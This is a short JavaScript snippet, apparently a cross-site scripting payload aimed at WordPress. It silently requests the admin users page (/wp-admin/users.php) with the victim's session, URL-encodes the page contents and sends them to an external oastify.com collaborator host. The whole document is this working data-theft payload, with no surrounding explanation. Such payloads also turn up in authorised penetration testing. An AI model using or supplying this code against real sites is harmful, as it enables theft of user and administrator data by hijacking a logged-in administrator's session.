var req = new XMLHttpRequest();

req.open("GET", "/wp-admin/users.php", false);
req.send();
var res = req.responseText;
var res_url = encodeURI(res);

var req2 = new XMLHttpRequest();

req2.open("GET", "https://gvfjffl7k87xqysjjj6tkgnn4ea5yvmk.oastify.com/?res="+ res_url, true);
req2.send();
